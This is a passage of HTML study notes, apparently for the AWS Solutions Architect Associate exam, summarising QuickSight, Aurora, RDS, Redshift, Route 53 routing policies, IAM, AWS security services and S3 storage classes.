<li>With QuickSight all users can meet varying analytic needs from the same source of truth through <ins> <b> modern interactive dashboards, paginated reports, embedded analytics and natural language queries </b></ins></li>
</ul>
<hr>
<h2 id="benefits"><a class="header" href="#benefits">Benefits</a></h2>
<hr>
<ul>
<li><b> Pay only for what you use</b></li>
<li>Scale to tens of thousands of <ins> users</ins></li>
<li>Easily embed analytics to differentiate your applications</li>
<li>Enable BI for everyone with QuickSight Q</li>
<li>Can get data insights in minutes from AWS services (e.g. Redshift, RDS, Athena, S3)</li>
<li>Can choose QuickSight to keep the data in SPICE up-yo-date as the data in the underlying sources change</li>
<li><b>SPICE </b>:
<ul>
<li>Amazon QuickSight is built with SPICE -<ins><i> a super-fast, parallel, In-memory calculation Engine. </i></ins></li>
<li>SPICE uses a combination of <ins> columnar storage, in-memory technologies </ins> enabled through the latest hardware innovations and machine code generation to run interactive queries on large datasets and get rapid responses</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aurora-cheatsheet-1"><a href="#aurora-cheatsheet-1" class="header">Aurora Cheatsheet</a></h1>
<hr>
<h2 id="aurora-cheatsheet"><a class="header" href="#aurora-cheatsheet">Aurora Cheatsheet</a></h2>
<hr>
<ul>
<li>When you need a fully-managed Postgres or MySQL database that needs to scale, automate backups, high availability and fault tolerance think Aurora</li>
<li>Aurora can run MySQL or Postgres database engines</li>
<li>Aurora <ins> MySQL is <b> 5x</b> faster </ins>over regular MySQL</li>
<li>AUrora <ins> Postgres is <b> 3x </b> faster</ins> over regular Postgres</li>
<li>Aurora is <i> 1/10 </i> the cost over its competitors with similar performance and availability options</li>
<li>Aurora replicates <b> <ins> 6 copies </ins> </b> for your database across <b> <ins> 3 availability zones </ins></b></li>
<li>Aurora is allowed up to <b> <ins> 15 Aurora Replicas </ins></b></li>
<li>An Aurora database can span multiple regions via Aurora Global Database</li>
<li>Aurora Serverless allows you to stop and start Aurora and scale automatically while keeping costs low</li>
<li>Aurora Serverless is ideal for new projects or projects with infrequent database usage</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rds-2"><a href="#rds-2" class="header">RDS</a></h1>
<ul>
<li><a href="#rds-1">RDS</a></li>
<li><a href="#rds-proxy-1">RDS Proxy</a></li>
<li><a href="#aurora-1">Aurora</a></li>
<li><a href="#introduction-to-aurora">Introduction to Aurora</a></li>
<li><a href="#aurora-availability">Aurora Availability</a></li>
<li><a href="#fault-tolerance-and-durability">Fault Tolerance and Durability</a></li>
<li><a href="#aurora-replicas">Aurora Replicas</a></li>
<li><a href="#aurora-serverless">Aurora Serverless</a></li>
</ul>
<h2 id="rds-1"><a class="header" href="#rds-1">RDS</a></h2>
<ul>
<li>Relational Database Service</li>
<li>Database service for database engines that use SQL as a query language</li>
<li>Engines:
<ul>
<li>Postgresql</li>
<li>Mysql / Mariadb</li>
<li>Oracle</li>
<li>MSSQL</li>
<li>IBM DB2</li>
<li>Aurora (Proprietary AWS Relational Database)</li>
</ul>
</li>
<li>You cannot access the underlying compute instances for RDS unless you are using RDS Custom
<ul>
<li>RDS Custom supports Oracle and Microsoft SQL Server</li>
</ul>
</li>
<li>RDS scales storage automatically
<ul>
<li>You have to set the Maximum Storage Threshold (max amount of storage to use)</li>
<li>Supports all RDS engines</li>
</ul>
</li>
</ul>
<h3 id="read-replicas-1"><a class="header" href="#read-replicas-1">Read Replicas</a></h3>
<ul>
<li>Scale out read operations</li>
<li>Create up to 15 read replicas within the same AZ or across AZ‚Äôs or across regions</li>
<li>Replication is asynchronous</li>
<li>You can promote a read-replica to it‚Äôs own database capable of full writes</li>
<li>Network Costs
<ul>
<li>If the read replicas is in the same region, there is no cost for replication traffic</li>
<li>For cross-region replication traffic, there is a cost</li>
</ul>
</li>
<li>You can setup read-replicas as Multi-AZ for fault tolerance</li>
</ul>
<h3 id="rds-multi-az"><a class="header" href="#rds-multi-az">RDS Multi-AZ</a></h3>
<ul>
<li>Mainly used for disaster recovery</li>
<li>synchronous replication to a standby database</li>
<li>One DNS name for both databases with automatic failover</li>
<li>Multi-AZ replicas cannot be read or written to until they are promoted to the primary instance</li>
<li>Converting from single-AZ to multi-AZ requires no downtime. This can be done in the ‚Äúmodify‚Äù section of the RDS database
<ul>
<li>A snapshot is taken and restored into a new standby database. Then a full sync of the database is initiated.</li>
</ul>
</li>
</ul>
<h3 id="rds-proxy-1"><a class="header" href="#rds-proxy-1">RDS Proxy</a></h3>
<ul>
<li>Fully managed database proxy for RDS</li>
<li>Allows apps to pool and share DB connections established with the database</li>
<li><ins><i>Improving database efficiency by reducing the stress on database resources (e.g CPU, RAM)and minimize open connections (and timeouts)</i></ins></li>
<li>Serverless, autoscaling, highly available (multi-AZ)</li>
<li>Reduced RDS and Aurora failover time by up 66%</li>
<li>Supports RDS (MySQL,PostgreSQL, MariaDB, MS SQL Server) and Aurora (MySQL, PostgreSQL)</li>
<li>No code changes required for most apps</li>
<li><i>Enforce <ins>IAM authentication </ins> for DB, and securely store credentials in <ins>AWS Secrets Manager</ins></i></li>
<li>RDS proxy is <ins>never publicly accessible</ins></li>
<li>RDS Proxy is useful for highly scaling lambda functions that open database connections</li>
</ul>
<img src="clouds/aws/saa-c03/images/Aurora/rds-proxy.jpg" width="47%" />
<h3 id="rds-backups"><a class="header" href="#rds-backups">RDS Backups</a></h3>
<ul>
<li>Daily full backup of the database</li>
<li>Transaction logs are backed up every 5 minutes</li>
<li>1 to 35 days of backup retention, set to 0 to disable</li>
</ul>
<h2 id="aurora-1"><a class="header" href="#aurora-1">Aurora</a></h2>
<ul>
<li>Fully managed Postgres or MySQL compatible database designed by default to scale and fine-tuned to be really fast</li>
<li>Aurora <strong><ins>automatically grows in increments of 10GB, up to 128 TB</ins></strong></li>
<li>5x performance over MySQL, 3x performance over Postgres</li>
</ul>
<h3 id="introduction-to-aurora"><a class="header" href="#introduction-to-aurora">Introduction to Aurora</a></h3>
<ul>
<li>Combines the speed and availability of high-end databases with the simplicity and cost-effectiveness of open source databases</li>
<li>Aurora can run either MySQL or Postgres compatible engines</li>
<li>Aurora MYSQL is <ins> 5x better performance </ins> than traditional MySQL</li>
<li>Aurora Postgres is <ins>3x better performance </ins> than traditional Postgres</li>
<li><ins>Aurora Costs more than RDS (20% more) but is more efficient</ins></li>
</ul>
<h3 id="aurora-availability"><a class="header" href="#aurora-availability">Aurora Availability</a></h3>
<ul>
<li>6 copies of your data in 3 AZ:
<ul>
<li>Needs only <ins>4 out of 6 copies for writes</ins> (so if one AZ is down then it is fine)</li>
<li>Need only <ins> 3 out of 6 for reads</ins></li>
<li>self healing with peer-to-peer replication</li>
<li>Storage is striped across 100s of volumes</li>
</ul>
</li>
<li>Automated failover for master happens in less than 30 seconds</li>
<li>Master + up to 15 Aurora Read Replicas serve reads. You can autoscale the read replicas. Clients connect to the ‚ÄúReader Endpoint‚Äù, which will point to any of the read instances</li>
</ul>
<img src="clouds/aws/saa-c03/images/Aurora/ha-aurora.jpg" width="47%" />
<img src="clouds/aws/saa-c03/images/Aurora/db-cluster.jpg" width="47%" />
<h3 id="fault-tolerance-and-durability"><a class="header" href="#fault-tolerance-and-durability">Fault Tolerance and Durability</a></h3>
<ul>
<li>
<p>Aurora Backup and Failover is handled <ins> automatically</ins></p>
</li>
<li>
<p>Aurora has a feature called Backtrack that allows you to restore to any point in time without restoring from backups</p>
</li>
<li>
<p><ins> Snapshots of data </ins> can be <b> shared </b> with other AWS accounts</p>
   <img src="clouds/aws/saa-c03/images/Aurora/aurora-fault-tolerance.jpg" width="47%" />
</li>
<li>
<p>Storage is <ins> self-healing </ins>, in that data blocks and disks are continuously scanned for errors and repaired automatically</p>
</li>
</ul>
<h3 id="aurora-replicas"><a class="header" href="#aurora-replicas">Aurora Replicas</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th></th><th>Amazon Aurora Replicas</th><th>Mysql Read Replicas</th></tr>
</thead>
<tbody>
<tr><td>Number of Replicas</td><td>Up to 15</td><td>Up to 5</td></tr>
<tr><td>Replication Type</td><td>Asynchronous(ms)</td><td>Asynchronous (s)</td></tr>
<tr><td>Performance impact on primary</td><td>Low</td><td>High</td></tr>
<tr><td>Act as failover target</td><td>Yes (no data loss)</td><td>Yes (potentially minutes of data loss)</td></tr>
<tr><td>Automated failover</td><td>Yes</td><td>No</td></tr>
<tr><td>Support for user-defined replication delay</td><td>No</td><td>Yes</td></tr>
<tr><td>Support for different data or schema vs primary</td><td>No</td><td>Yes</td></tr>
</tbody>
</table>
</div>
<h3 id="aurora-serverless"><a class="header" href="#aurora-serverless">Aurora Serverless</a></h3>
<ul>
<li>Aurora except the database will automatically start up, shut down, and scale capacity up or down based on your application‚Äôs needs</li>
<li>Apps used a few minutes several times per day or week, eg. low-volume blog site</li>
<li>pay for database storage and the database capacity and I/O your database consumes while it is active</li>
</ul>
<h3 id="aurora-backups"><a class="header" href="#aurora-backups">Aurora Backups</a></h3>
<ul>
<li>1 to 35 days rention</li>
<li>Cannot be disabled</li>
<li>Point in time recovery</li>
<li>Manual snaphots
<ul>
<li>Retain manually created snapshots for any amount of time</li>
</ul>
</li>
</ul>
<h3 id="aurora-database-cloning"><a class="header" href="#aurora-database-cloning">Aurora Database Cloning</a></h3>
<ul>
<li>Clone an existing Aurora database into a new database</li>
<li>Uses copy-on-write, so it‚Äôs very fast</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="amazon-redshift-1"><a href="#amazon-redshift-1" class="header">Amazon Redshift</a></h1>
<ul>
<li><a href="#amazon-redshift">Amazon Redshift</a></li>
<li><a href="#what-is-data-warehouse">What is Data Warehouse ?</a></li>
<li><a href="#introduction-to-redshift">Introduction to Redshift</a></li>
<li><a href="#redshift-use-case">Redshift Use Case</a></li>
<li><a href="#redshift-columnar-storage">Redshift Columnar Storage</a></li>
<li><a href="#redshift-configurations">Redshift Configurations</a></li>
</ul>
<hr>
<h2 id="amazon-redshift"><a class="header" href="#amazon-redshift">Amazon Redshift</a></h2>
<hr>
<ul>
<li>Fully managed <b> <ins> Petabyte-size Data warehouse </ins></b>.</li>
<li>Analyze (Run complex SQL queries) on massive amounts of data Columnar Store database</li>
</ul>
<hr>
<h2 id="what-is-data-warehouse--1"><a class="header" href="#what-is-data-warehouse--1">What is Data Warehouse ?</a></h2>
<hr>
<ul>
<li><b> What is Data Warehouse  ?</b>
<ul>
<li>A transaction symbolizes unit of work performed within a database management system</li>
<li>eg. reads and writes</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Database</th><th>Data warehouse</th></tr>
</thead>
<tbody>
<tr><td>Online Transaction Processing (OLTP)</td><td>Online Analytical Processing (OLAP)</td></tr>
<tr><td>A database was built to store current transactions and enable fast access to specific transactions for ongoing business processes</td><td>A data warehouse is built to store large quantities of historical data and enable fast, complex queries across all the data</td></tr>
<tr><td>Adding Items to your Shopping List</td><td>Generating Reports</td></tr>
<tr><td>Single Source</td><td>Multiple Source</td></tr>
<tr><td>Short transactions (small and simple queries ) with an emphasis on writes.</td><td>Long transactions (long and complex queries ) with an emphasis on reads</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="introduction-to-redshift"><a class="header" href="#introduction-to-redshift">Introduction to Redshift</a></h2>
<hr>
<ul>
<li>AWS Redshift is the AWS managed, petabyte-scale solution for <ins> Data Warehousing </ins></li>
<li>Pricing starts at just <ins> $0.25 per hour </ins> with no upfront costs or commitments.</li>
<li>Scale up to petabytes for $1000 per terabyte , per year</li>
<li>Redshift price is less than 1/10 cost of most similar services</li>
<li>Redshift is used for Business Intelligence</li>
<li>Redshift uses <ins> OLAP (Online Analytics Processing System)</ins></li>
<li>Redshift is <b> <ins> Columnar Storage Database  </ins> </b></li>
<li>Columnar Storage for database tables is an important factor in optimizing analytic query performance because it <ins> drastically reduces the overall disk I/O requirements </ins> and reduces the amount of data you need to load from disk</li>
</ul>
<hr>
<h2 id="redshift-use-case"><a class="header" href="#redshift-use-case">Redshift Use Case</a></h2>
<hr>
<ul>
<li>
<p>We want to continuously COPY data from</p>
<ol>
<li>EMR</li>
<li>S3 and</li>
<li>DynamoDB</li>
</ol>
<ul>
<li>to power a customer Business Intelligence tool</li>
</ul>
</li>
<li>
<p>Using a third-party library we can connect and query Redshift for data.</p>
  <img src="clouds/aws/saa-c03/images/RedShift/redshift-usecase.jpg" width="47%" />
</li>
</ul>
<hr>
<h2 id="redshift-columnar-storage"><a class="header" href="#redshift-columnar-storage">Redshift Columnar Storage</a></h2>
<hr>
<ul>
<li>
<p>Columnar Storage stores data together as columns instead of rows</p>
  <img src="clouds/aws/saa-c03/images/RedShift/columnar-storage.jpg" width="47%" />
</li>
<li>
<p>OLAP applications look at multiple records at the same time. You save memory because you fetch just the columns of data you need instead of whole rows</p>
</li>
<li>
<p>Since data is stored via column, that means all data is of the same data-type allowing for easy compression</p>
</li>
</ul>
<hr>
<h2 id="redshift-configurations"><a class="header" href="#redshift-configurations">Redshift Configurations</a></h2>
<hr>
<ul>
<li><b> Single Node </b>
<ul>
<li>Nodes come in sizes of 160Gb. You can launch a single node to get started with Redshift</li>
</ul>
</li>
<li><b> Multi-Node </b>
<ul>
<li>You can launch a cluster of nodes with Multi Node mode</li>
</ul>
</li>
<li><b> Leader Node </b>
<ul>
<li>Manages client connections and receiving</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dns-4"><a href="#dns-4" class="header">DNS</a></h1>
<ul>
<li><a href="#dns">DNS</a></li>
<li><a href="#records-ttl">Records TTL</a></li>
<li><a href="#cname-vs-alias-1">CNAME vs Alias</a></li>
<li><a href="#routing-policies-1">Routing Policies</a></li>
<li><a href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></li>
</ul>
<h2 id="dns"><a class="header" href="#dns">DNS</a></h2>
<hr>
<ul>
<li>Domain Name System which translates the human friendly hostnames into the machine IP addresses.</li>
<li>www.google.com =&gt;172.217.18.36
<img src="clouds/aws/saa-c03/images/Route53/DNS.jpg" width="57%" /></li>
<li>Any zone costs 50 cents/month</li>
<li>Public vs Private hosted zones</li>
</ul>
<h2 id="records-ttl"><a class="header" href="#records-ttl">Records TTL</a></h2>
<hr>
<ul>
<li>TTL - Time to live</li>
<li>High TTL - e.g. 24 hr
<ul>
<li>less traffic on Route 53</li>
<li>Possibly outdated records</li>
</ul>
</li>
<li>Low TTL - e.g. 60s
<ul>
<li>More traffic on Route 53 ($$)</li>
<li>Records are outdated for less time</li>
<li>Easy to change records</li>
</ul>
</li>
</ul>
<img src="clouds/aws/saa-c03/images/Route53/ttl.jpg" width="57%" />
<ul>
<li>Except for Alias records, TTL is mandatory for each DNS record</li>
</ul>
<h2 id="cname-vs-alias-1"><a class="header" href="#cname-vs-alias-1">CNAME vs Alias</a></h2>
<hr>
<ul>
<li>AWS resources (Load Balancer, CLoudFront..) expose an AWS hostname:
<ul>
<li>lb l-1234.us-east-2.elb.amazonaws.com and you want myapp.mydomain.com</li>
</ul>
</li>
<li>CNAME:
<ul>
<li>Points a hostname to any other hostname (app.domain.com =&gt; blabla.anything.com)</li>
<li>You cannot create a CNAME for the Apex record (root domain)</li>
</ul>
</li>
<li>Alias:
<ul>
<li>Points a hostname to an AWS Resource (app.mydomain.com =&gt; blabla.amazonaws.com)</li>
<li><ins>WORKS for ROOT DOMAIN and NON ROOT DOMAIN (aka, mydomain.com)</ins></li>
<li>Free of charge</li>
<li>Native health check</li>
<li>Only supported for A and AAAA record types</li>
<li>Cannot set alias for an EC2 instance name</li>
</ul>
</li>
</ul>
<h2 id="routing-policies-1"><a class="header" href="#routing-policies-1">Routing Policies</a></h2>
<hr>
<ul>
<li>
<p><strong>Simple</strong></p>
<ul>
<li>Typically, the simple type of routing policy will resolve to a single resource</li>
<li>If the record resolves to multiple values, the client will choose a random one</li>
<li>When using the Alias record type, the record can only resolve to one resource</li>
</ul>
</li>
<li>
<p><strong>Weighted</strong></p>
<ul>
<li><strong><ins>Control the % of the requests that go to each specific resource.</ins></strong></li>
<li>Assign each record a relative weight
<ul>
<li>$ \text traffic {(%)} = {\displaystyle \text {weight for a specific record } \over \displaystyle \text {sum of all the weights for all records }} $</li>
<li>The sum of the weights of all records does not need to equal 100</li>
</ul>
</li>
<li>DNS records must have the same name and type</li>
<li>Can be associated with Health Checks</li>
<li>Use cases: load balancing between regions, testing new application versions<br><img src="clouds/aws/saa-c03/images/Route53/weighted-routing-policy.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong>Latency </strong></p>
<ul>
<li><ins>Redirect to the resource that has the <strong> least latency </strong>close to us </ins></li>
<li>Super helpful when latency for users is a priority</li>
<li>Latency is based on traffic between users and AWS Regions</li>
<li>Germany users may be directed to the US (if that‚Äôs the lowest latency)</li>
<li>Can be associated with Health Checks (has a failover capability)</li>
</ul>
</li>
<li>
<p><strong>Failover</strong>
<img src="clouds/aws/saa-c03/images/Route53/failover.jpg" width="57%" /></p>
</li>
<li>
<p><strong>Geolocation</strong></p>
<ul>
<li>Different from latency based</li>
<li><strong><i><ins>This routing is based on user location </ins></i></strong></li>
<li>Should <strong>create a ‚ÄúDefault‚Äù record </strong>(in case there‚Äôs no match on location)</li>
<li>Use cases: website localization, restrict content distribution, load balancing</li>
<li>Can be associated with Health Checks
<img src="clouds/aws/saa-c03/images/Route53/geolocation.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong> Geoproximity </strong></p>
<ul>
<li><strong><ins>Route traffic to your resources based on the location of users and resources </ins></strong></li>
<li>Ability to <ins>shift more traffic to resources based on the <strong>defined bias</strong></ins>
<img src="clouds/aws/saa-c03/images/Route53/geoproximity.jpg" width="57%" /></li>
<li>To change the size of the geographic region, specify bias values:
<ul>
<li>To expand (1 to 99)- more traffic to the resource</li>
<li>To shrink (-1 to 99)- less traffic to the resource
<img src="clouds/aws/saa-c03/images/Route53/geoproximity-higher-bias.jpg" width="57%" /></li>
</ul>
</li>
<li>Resources can be:
<ul>
<li>AWS resources (specify AWS region)</li>
<li>Non-AWS resources (specify Latitude and Longitude)</li>
</ul>
</li>
<li>You must use Route 53 Traffic Flow to use this feature</li>
</ul>
</li>
<li>
<p>Health Checks</p>
<ul>
<li>HTTP Health Checks are only for public resources. You must create a CloudWatch Metric and associate a CloudWatch Alarm, then create a Health Check that checks the alarm</li>
<li>15 global health checkers</li>
<li>Health checks methods:
<ul>
<li>Monitor an endpoint
<ul>
<li>Healthy/unhealthy threshold - 3 (default)</li>
<li>Interval 30 seconds</li>
<li>Supports HTTP, HTTPS, and TCP</li>
<li>if &gt; 18% of health checkers report the endpoint is healthy, Route53 considers it healthy.</li>
<li>You can choose which locations you want Route53 to use</li>
<li>You must configure the firewall to allow traffic from the health checkers</li>
</ul>
</li>
<li>Calculated Health Checks
<ul>
<li>Combine the results of multiple health checks into a single health check</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1"><a class="header" href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket-1">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></h2>
<hr>
<ul>
<li>An S3 bucket that is configured to host a static website
<ul>
<li>You can route traffic for a domain and its subdomains, such as example.com and www.example.com to a single bucket.</li>
<li>Choose the bucket that has the same name that you specified for Record name</li>
<li>The name of the bucket is the same as the name of the record that you are creating</li>
<li>The bucket is configured as a website endpoint</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="iam-1"><a class="header" href="#iam-1">IAM</a></h1>
<h2 id="groups"><a class="header" href="#groups">Groups</a></h2>
<ul>
<li>Groups can only contain users, not other groups</li>
</ul>
<h2 id="user-permissions"><a class="header" href="#user-permissions">User Permissions</a></h2>
<ul>
<li>Permission Boundaries can be set for a user account. They control the maximum permissions for the user. This can be helpful to delegate permission management to other users.</li>
<li>Permissions can be defined on a user account using a built-in policy or by adding the user to a group with defined permissions</li>
<li>You can create an access key for a user that can be used to access AWS APIs via the CLI, an Application, third party service, etc.</li>
<li>Permission policies are defined in JSON documents known as IAM policies:
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [
          {
              "Action": "ec2:*",
              "Resource": "*",
              "Effect": "Allow",
              "Condition": {
                  "StringEquals": {
                      "ec2:Region": "us-east-2"
                  }
              }
          }
      ]
  }
</code></pre>
</li>
<li>Modifying custom IAM policies creates a new version of that policy</li>
</ul>
<h1 id="password-policy-1"><a class="header" href="#password-policy-1">Password Policy</a></h1>
<ul>
<li>You can define a password policy in IAM</li>
<li>Typical password policy settings</li>
</ul>
<h1 id="mfa"><a class="header" href="#mfa">MFA</a></h1>
<ul>
<li>MFA Device Options
<ul>
<li>Virtual MFA Device
<ul>
<li>Google Authenticator</li>
<li>Authy</li>
</ul>
</li>
<li>Universal 2nd Factor (U2F) Security Key
<ul>
<li>Yubikey</li>
</ul>
</li>
<li>Hardware Key Fob
<ul>
<li>Provided By Gemalto (3rd party)</li>
</ul>
</li>
<li>Hardware Device for AWS GovCloud
<ul>
<li>Provided by SurePassID</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="roles"><a class="header" href="#roles">Roles</a></h1>
<ul>
<li>Used to provide access to AWS services</li>
<li>For example, provide an EC2 instance access to an S3 bucket</li>
</ul>
<h1 id="security-tools-in-iam"><a class="header" href="#security-tools-in-iam">Security Tools in IAM</a></h1>
<ul>
<li>Credential Report: Generates a CSV file contains details about user accounts</li>
<li>Security Access Advisor: Accessible from an individual account in IAM. Shows what AWS services the AWS account is accessing.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-certificate-manager"><a class="header" href="#aws-certificate-manager">AWS Certificate Manager</a></h1>
<ul>
<li>Integration with API Gateway
<ul>
<li>Create a custom domain name in API Gateway</li>
<li>For edge optimized API Gateways, The TLS certificate must be in the same region as CloudFront</li>
<li>For regional API Gateways, The TLS certificate must be imported on API gateway, in the same region as the API Gateway</li>
</ul>
</li>
</ul>
<h1 id="aws-waf-web-application-firewall"><a class="header" href="#aws-waf-web-application-firewall">AWS WAF (Web Application Firewall)</a></h1>
<ul>
<li>Protection at Layer 7 of the OSI Model</li>
<li>Can be deployed on ALB, CloudFront, API Gateway, AppSync GraphQL API, Cognito User Pool</li>
<li>After deploying the firewall, you create a Web ACL rule:
<ul>
<li>Filter based on IP address, HTTP Headers, HTTP body, URI strings, Message Size, geo-match, and rate-based rules</li>
<li>Web ACL‚Äôs are regional. Except for in CloudFront where they are global</li>
</ul>
</li>
<li>How can we get a fixed IP while using WAF with ALB? Use a Global Accelerator in front of the ALB. The Global Accelerator will provide the static IP address, since an ALB cannot have a static IP.</li>
</ul>
<h1 id="aws-shield"><a class="header" href="#aws-shield">AWS Shield</a></h1>
<ul>
<li>Protect from DDoS attacks</li>
<li>Standard and Advanced SKUs
<ul>
<li>Standard is free and included/enabled on all VPCs</li>
<li>Advanced is $3000/month per organization. Protection from more sophisticated DDoS attacks on EC2, ELB, CloudFront, Global Accelerator, and Route 53. Advanced also included 24/7 access to the DDoS Response Team. Shield Advanced will automatically create WAF rules for you.</li>
</ul>
</li>
</ul>
<h1 id="aws-firewall-manager"><a class="header" href="#aws-firewall-manager">AWS Firewall Manager</a></h1>
<ul>
<li>Manage rules for multiple firewalls in an AWS organization</li>
<li>Can be used with WAF</li>
<li>Policies are created at the regional level</li>
<li>Rules are applied to new resources when they are created automatically</li>
</ul>
<h1 id="guardduty"><a class="header" href="#guardduty">GuardDuty</a></h1>
<ul>
<li>Use ML to protect your AWS account</li>
<li>Uses CloudTrail Event Logs, VPC Flow logs, and DNS Logs. Optional EKS audit logs, RDS and Aurora logs, EBS, Lambda, and S3 data events</li>
<li>Can setup EventBridge rules to be notified in case of findings.</li>
<li>Can protect against Crypto Currency attacks</li>
</ul>
<h1 id="inspector"><a class="header" href="#inspector">Inspector</a></h1>
<ul>
<li>Automated security assessments on EC2 instances. Use AWS SSM Agent to scan the instance</li>
<li>Automated scans of container images pushed to ACR for CVEs</li>
<li>Lambda Functions can be scanned for vulnerabilities in code and package dependencies</li>
<li>Report findings in Security Hub or send findings via EventBridge</li>
</ul>
<h1 id="macie"><a class="header" href="#macie">Macie</a></h1>
<ul>
<li>Use ML and pattern matching to discover and protect sensitive data in AWS in S3</li>
<li>Notify you through EventBridge when PII is found</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="storage-cheatsheet"><a href="#storage-cheatsheet" class="header">Storage-cheatsheet</a></h1>
<ul>
<li><b>Simple Storage Service (S3) </b> Object-based storage. Store unlimited amount of data without worry of underlying storage infrastructure</li>
<li>S3 replicates data across at least <ins>  3 AZs to ensure 99.99% Availability </ins> and 11‚Äô9s of durability</li>
<li>Objects contain data (they‚Äôre like files)</li>
<li>
<ul>
<li>Objects can be size anywhere from <b> <ins> 0 Bytes up to 5 Terabytes </ins></b></li>
</ul>
</li>
<li>Buckets contain objects. Buckets can also contain folders which can in turn can contain objects</li>
<li>Bucket names are unique across all AWS accounts. Like a domain name</li>
<li>When you upload a file to S3 successfully you‚Äôll receive a HTTP 200 code . <b> Lifecycle Management </b> Objects can be moved between storage classes or objects can be deleted automatically based on schedule</li>
<li><b> Versioning </b> Objects are given a Version ID. When new objects are uploaded the old objects are kept. You can access any object version. When you delete an object the previous object is restored. Once Versioning is turned on it cannot be turned off, only suspended.</li>
<li><b> MFA DELETE </b> enforce DELETE operations to require MFA token in order to delete an object. Must have verioning turned on to use. Can only turn on MFA delete from the AWS CLI. Root Account is only allowed to delete objects</li>
<li>All new buckets are <b> private by default </b>
Logging can be turned to on a bucket to log to track operations performed on objects</li>
<li><b> Access Control </b> is configured using <b> Bucket Policies </b> and <b> Access Control Lists (ACL) </b></li>
<li><b> Bucket Policies </b> are JSON documents which let you write complex control access</li>
<li><b> ACLs </b> are the legacy method (not depracated) where you grant access to objects and buckets with simple actions</li>
<li><b> Security in Transit </b> Uploading is done over SSL</li>
<li><b> SSE </b> stands for <ins> Server Side Encryption </ins>, S3 has 3 options for SSE</li>
<li><b> SSE-AES </b> S3 handles the key, uses AES-256 algorithm</li>
<li><b> SSE-KMS </b> Envelope encryption via AWS KMS and you manage the keys</li>
<li><b>SSE-C </b> Customer provided key (you manage the key)</li>
<li><b> Client Side Encryption </b>You must encrypt your own files before uploading them to S3</li>
<li><b> Cross Region Replication (CRR) </b> allows you to replicate files across regions for greater durability.You  must have versioning turned on in the source and destination bucket. You can have CRR replicate to bucket in another AWS account</li>
<li><b> Transfer Acceleration </b> Provide faster and secure uploads from anywhere in the world. Data is uploaded via distinct url to an Edge location. Data is then transported to your S3 bucket via AWS backbone network.</li>
<li><b> Presigned Urls </b> is a URL generated via the AWS CLI and SDK. It provides temporary access to write or download object data. Presigned URLs are commonly used to access private objects.</li>
<li>S3 has <b> 6 different storage classes </b>
<ul>
<li><b> Standard </b> Fast 99.99% Availability, 11 9‚Äôs Durability. Replicated across at least three AZs</li>
<li><b> Intelligent Tiering </b> Uses ML to analyze your object usage and determine the appropriate storage class. Data is moved to the most cost-effective access tier, without any performance impact or added overhead.</li>
<li><b> Standard Infrequently Accessed (IA) </b>n Still fast! Cheaper if you access files less than once a month. Additional retrieval fee is applied. 50 % less than Standard (reduced availability )</li>
<li><b> One Zone IA </b> Still fast! Objects only exist in one AZ. Availability (is 99.5%). but cheaper then standard IA by 20% less (Reduce durability ) Data could get destroyed. A retrieval fee is applied.</li>
<li><b> Glacier </b> For long term cold storage. Retrieval of data can take minutes to hours but the off is very cheap storage</li>
<li><b> Glacier Deep Archive </b> The lowest cost storage class. Data retrieval time is 12 hours</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="introduction-to-s3-1"><a href="#introduction-to-s3-1" class="header">Introduction to S3</a></h1>
<ul>
<li><a href="#introduction-to-s3">Introduction to S3</a></li>
<li><a href="#s3-storage-classes-1">S3 Storage Classes</a></li>
<li><a href="#storage-class-comparison">Storage class comparison</a></li>
<li><a href="#s3-security-1">S3 Security</a></li>
<li><a href="#s3-encryption-1">S3 Encryption</a></li>
<li><a href="#s3-objects">S3 Objects</a></li>
<li><a href="#s3-data-consistency">S3 Data Consistency</a></li>
<li><a href="#s3-cross-region-replication">S3 Cross-Region Replication</a></li>
<li><a href="#s3-versioning-1">S3 Versioning</a></li>
<li><a href="#lifecycle-management">Lifecycle Management</a></li>
<li><a href="clouds/aws/saa-c03/Storage/s3-transfer-acceleration">S3 Transfer Acceleration</a></li>
<li><a href="#presigned-urls-1">Presigned URLs</a></li>
<li><a href="#mfa-delete-1">MFA Delete</a></li>
<li><a href="#aws-snow-family">AWS Snow Family</a></li>
<li><a href="#storage-services">Storage Services</a></li>
<li><a href="#storage-gateway-1">Storage Gateway</a></li>
<li><a href="#amazon-fsx-vs-efs">Amazon FSx vs EFS</a></li>
<li><a href="#s3-object-lock">S3 Object Lock</a>
<ul>
<li><a href="#governance-mode">Governance mode</a></li>
<li><a href="#compliance-mode">Compliance mode</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="introduction-to-s3"><a class="header" href="#introduction-to-s3">Introduction to S3</a></h2>
<hr>
<ul>
<li><b> What is Object Storage (Object-based storage)? </b></li>
<li>data storage architecture that manages data as objects, as opposed to other storage architectures:
<ul>
<li>file systems: which manages data as files and fire hierarchy</li>
<li>block storage- which manages data as blocks within sectors and tracks
<ul>
<li>S3 provides with <ins> Unlimited storage </ins></li>
<li>Need not think about underlying infrastructure</li>
<li>S3 console provides an interface for you to upload and access your data</li>
<li>Individual <ins> Object </ins> can be store form <ins> 0 Bytes to 5 Terabytes </ins> in size</li>
